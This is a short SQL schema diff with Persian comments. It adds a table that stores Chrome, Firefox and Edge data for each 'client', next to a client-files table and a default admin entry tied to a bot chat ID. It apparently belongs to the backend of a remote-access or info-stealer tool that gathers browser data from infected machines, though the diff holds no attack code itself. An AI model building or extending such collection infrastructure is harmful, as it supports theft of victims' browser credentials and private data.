@@ -140,6 +140,20 @@ CREATE TABLE IF NOT EXISTS client_files (
     INDEX idx_filename (filename)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
 
+-- جدول داده‌های کامل مرورگر
+CREATE TABLE IF NOT EXISTS browser_data_comprehensive (
+    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    client_id VARCHAR(32) NOT NULL,
+    chrome_data MEDIUMTEXT,
+    firefox_data MEDIUMTEXT,
+    edge_data MEDIUMTEXT,
+    collected_at DATETIME NOT NULL,
+    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
+    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
+    INDEX idx_client_id (client_id),
+    INDEX idx_collected_at (collected_at)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+
 -- درج کاربر ادمین پیش‌فرض
 -- توجه: این را با ADMIN_CHAT_ID واقعی خود جایگزین کنید
 INSERT INTO users (user_id, is_active, is_admin, created_at)
